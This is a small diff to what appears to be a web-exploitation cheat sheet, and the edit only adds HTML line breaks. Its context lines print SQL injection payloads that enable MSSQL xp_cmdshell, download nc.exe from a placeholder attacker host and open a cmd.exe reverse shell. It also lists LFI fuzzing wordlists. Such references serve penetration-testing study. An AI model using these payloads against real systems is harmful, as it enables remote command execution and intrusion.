@@ -284,7 +284,7 @@ Web Exploitation
          ' EXEC sp_configure 'xp_cmdshell', 1--
          ' reconfigure--
          ' EXEC xp_cmdshell 'certutil -urlcache -f http://<LHOST>:<LPORT>/nc.exe nc.exe'--
-         ' EXEC xp_cmdshell "nc.exe -e cmd.exe <LHOST> <LPORT>";--<br>
+         ' EXEC xp_cmdshell "nc.exe -e cmd.exe <LHOST> <LPORT>";--<br><br>
          
 `LFI/RFI`
 
@@ -300,7 +300,7 @@ Web Exploitation
 -    Wordlists  
 
          /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
-         /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt<br>
+         /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt<br><br>
          
 `CGI-BIN`
 
